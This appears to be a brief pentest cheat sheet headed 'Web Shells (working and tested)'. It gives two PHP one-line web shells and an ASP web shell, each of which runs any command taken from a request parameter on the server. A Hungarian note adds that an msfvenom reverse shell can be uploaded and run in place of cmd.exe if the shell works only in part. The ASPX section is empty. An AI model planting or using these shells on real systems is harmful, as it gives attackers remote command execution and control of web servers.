# Web Shells (working and tested)
## PHP
<pre>
&lt;?php system($_GET['cmd']); ?&gt;
</pre>
<pre>
&lt;?php system($_GET[1]); ?&gt;
</pre>
## ASP
<pre>
&lt;%
Set rs = CreateObject("WScript.Shell")
'Set cmd = rs.Exec("cmd /c whoami")
Set cmd = rs.Exec("cmd /c " & request("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
%&gt;
</pre>
### ha csak felig mukodik
* probaljunk meg feltolteni egy sima reverse shell-t (msfvenomosat)
* es ne a cmd.exe-vel akarjunk futtatni dolgokat az asp webshell-ben
* hanem csak siman a cmd helyett a reverse shell-t futtassuk!!!
## ASPX
...
